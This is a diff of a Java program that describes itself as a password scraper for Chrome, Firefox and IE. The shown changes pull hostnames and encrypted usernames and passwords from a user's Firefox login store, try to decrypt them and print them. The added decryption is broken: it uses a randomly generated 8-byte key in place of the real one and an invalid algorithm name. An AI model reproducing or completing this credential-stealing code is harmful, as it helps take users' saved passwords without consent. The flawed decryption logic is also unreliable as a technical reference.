@@ -1,7 +1,6 @@
 // Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
 import java.util.*;
 import java.util.Base64;
-import java.util.Base64.Decoder;
 
 import javax.crypto.Cipher;
 
@@ -10,6 +9,9 @@ import org.apache.commons.io.FileUtils;
 
 // WIN32 Native Functions
 import com.sun.jna.platform.win32.*;
+
+import sun.security.pkcs11.*;
+import sun.security.pkcs11.wrapper.PKCS11;
 
 // Standard Java IO
 import java.io.File;
@@ -37,23 +39,18 @@ import org.json.simple.parser.ParseException;
 import org.mozilla.jss.*;
 import org.mozilla.jss.CryptoManager.NotInitializedException;
 import org.mozilla.jss.crypto.AlreadyInitializedException;
-//import org.mozilla.jss.crypto.CryptoToken;
-//import org.mozilla.jss.crypto.SecretDecoderRing;
-//import org.mozilla.jss.crypto.SymmetricKey;
-import org.mozilla.jss.crypto.TokenException;
-//import org.mozilla.jss.pkcs11.KeyType;
+import org.mozilla.jss.pkcs11.PK11Token;
 
 // Java Sec Suite
 import java.security.*;
+import java.security.spec.KeySpec;
+
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.DESedeKeySpec;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
-
-// Sun InfoSec Libs
-import sun.security.pkcs11.*;
 
 public class jdec extends Crypt32Util {
 	
@@ -138,7 +135,7 @@ public class jdec extends Crypt32Util {
 		}
 	}
 	
-	public static void FirefoxDec() throws IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
+	public static void FirefoxDec() throws IOException, ParseException, GeneralSecurityException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, NotInitializedException {
 		
 		// Get username
 		String user = System.getProperty("user.name");
@@ -193,6 +190,7 @@ public class jdec extends Crypt32Util {
 		// Get websites
 		for(int j = 0; j < logins.length(); j++){
 			ffurls.add(logins.getJSONObject(j).getString("hostname"));
+			System.out.println("URL: " + logins.getJSONObject(j).getString("hostname"));
 		}
 		
 		// Get encrypted usernames
@@ -205,34 +203,50 @@ public class jdec extends Crypt32Util {
 			ffencryptedpasswords.add(logins.getJSONObject(j).getString("encryptedPassword"));
 		}
 		
-		// Now begins the arduous task of wrestling with the Java security libs
+		CryptoManager.initialize(".");
+		CryptoManager cm = CryptoManager.getInstance();
 		
-		// The provider is the Java object that provides cryptographic services for us, in this case they'll be services based on the PKCS11 standard
-		// Unfortunately it seems the NSS dlls have not been brought over to 64-bit Java.. this may kill my goals for decrypting Firefox passwords in Java
-		// May need to just simply use a python script as some kind of placeholder, unfortunate
-		Provider p = new sun.security.pkcs11.SunPKCS11("pkcs11.cfg");
-		Security.addProvider(p);
+		// Get python script to decrypt key3.db or retrieve keys, better yet just run python
+		// script here to decrypt everything
 		
-		// Parse key3.db to decode DES3 encrypted usernames and passwords with JSS
-		Path keypath = Paths.get("key3.db");
-		byte[] key = Files.readAllBytes(keypath); 
+		// First key from key3.db goes here
+		SecureRandom sr = new SecureRandom();
+		byte[] key = new byte[8];
+		sr.nextBytes(key);
+		KeySpec ks = new DESedeKeySpec(key);
+		SecretKeyFactory skf = SecretKeyFactory.getInstance("DESEDE_ENCRYPTION_SCHEME");
+		SecretKey ffkey = skf.generateSecret(ks);
 		
-		// Declare Base64 Decoder
-		Base64.Decoder dec = Base64.getDecoder();
+		Cipher cipher = Cipher.getInstance("DESede");
 		
 		System.out.println("Firefox usernames and passwords: ");
 		
+		// Decode usernames, 
 		for(String username : ffencryptedusernames){
-
+			try{
+			cipher.init(Cipher.DECRYPT_MODE, ffkey);
+			byte[] encryptedText = Base64.getDecoder().decode(username);
+			byte[] plainText = cipher.doFinal(encryptedText);
+			ffdecryptedusernames.add(new String(plainText));
+			System.out.println("Username: " + new String(plainText));
+			}catch(Exception e){e.printStackTrace();}
 		}
 		
+		// Decode passwords
 		for(String password : ffencryptedpasswords){
-			//ffdecryptedpasswords.add(Base64.decodeBase64(password).toString());
+			try{
+			cipher.init(Cipher.DECRYPT_MODE, ffkey);
+			byte[] encryptedText = Base64.getDecoder().decode(password);
+			byte[] plainText = cipher.doFinal(encryptedText);
+			ffdecryptedpasswords.add(new String(plainText));
+			System.out.println("Password: " + new String(plainText));
+			}catch(Exception e){e.printStackTrace();}
 		}
 		
 	}
 	
-	public static void main(String[] args) throws SQLException, IOException, ParseException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, GeneralSecurityException, TokenException, NotInitializedException {
+	
+	public static void main(String[] args) throws SQLException, IOException, ParseException, GeneralSecurityException, KeyDatabaseException, CertDatabaseException, AlreadyInitializedException, NotInitializedException {
 		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
